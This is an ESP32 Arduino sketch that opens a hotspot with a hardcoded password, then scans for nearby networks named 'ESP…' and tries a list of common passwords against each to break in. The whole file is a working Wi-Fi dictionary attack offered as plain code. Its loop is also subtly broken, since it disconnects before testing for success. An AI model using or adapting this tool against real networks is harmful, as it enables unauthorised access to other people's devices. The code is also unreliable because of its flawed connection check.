#include <WiFi.h>

// SSID (Wi-Fi name) and Password for the hotspot
const char* apSSID = "wifi_m2dfs_milan";
const char* apPassword = "qsdjunfb";  // Minimum 8 characters

// List of common passwords to try
const char* passwords[] = {"123456", "password", "123456789", "mds_fast_12", "abc123", "letmein"};
const int numPasswords = sizeof(passwords) / sizeof(passwords[0]);

void WiFiEvent(WiFiEvent_t event, WiFiEventInfo_t info) {
  switch (event) {
    case WIFI_EVENT_AP_STACONNECTED:
      Serial.println("Client connected");
      break;

    case WIFI_EVENT_AP_STADISCONNECTED:
      Serial.println("Client disconnected");
      break;

    default:
      break;
  }
}

void setup() {
  Serial.begin(115200);
  Serial.println("Setting up Wi-Fi access point...");

  // Register the event handler
  WiFi.onEvent(WiFiEvent);

  // Set up the ESP32 as an access point
  WiFi.softAP(apSSID, apPassword);

  // Display the IP address of the access point
  IPAddress IP = WiFi.softAPIP();
  Serial.print("Access Point IP address: ");
  Serial.println(IP);

  Serial.println("Wi-Fi access point setup complete.");

  // Start scanning for nearby networks after setup
  scanAndConnect();
}

void loop() {
  // Nothing needed in the loop
  delay(1000);
}

void scanAndConnect() {
  Serial.println("Scanning for nearby Wi-Fi networks...");

  // Wi-Fi scanning
  int numNetworks = WiFi.scanNetworks();
  if (numNetworks == -1) {
    Serial.println("Error during Wi-Fi scan");
    return;
  }

  Serial.printf("Found %d networks:\n", numNetworks);

  for (int i = 0; i < numNetworks; i++) {
    String ssid = WiFi.SSID(i);
    if (ssid.startsWith("ESP")) {
      Serial.printf("Trying to connect to %s...\n", ssid.c_str());

      for (int j = 0; j < numPasswords; j++) {
        Serial.printf("Trying password: %s\n", passwords[j]);

        WiFi.begin(ssid.c_str(), passwords[j]);
        unsigned long startTime = millis();

        while (millis() - startTime < 10000) { // 10 seconds timeout
          if (WiFi.status() == WL_CONNECTED) {
            Serial.println("Connected successfully!");
            Serial.printf("IP Address: %s\n", WiFi.localIP().toString().c_str());
            break;
          }
          delay(500);
        }

        WiFi.disconnect();
        if (WiFi.status() == WL_CONNECTED) {
          break;
        }
      }
    }
  }

  // Clear the scan results to free memory
  WiFi.scanDelete();
}

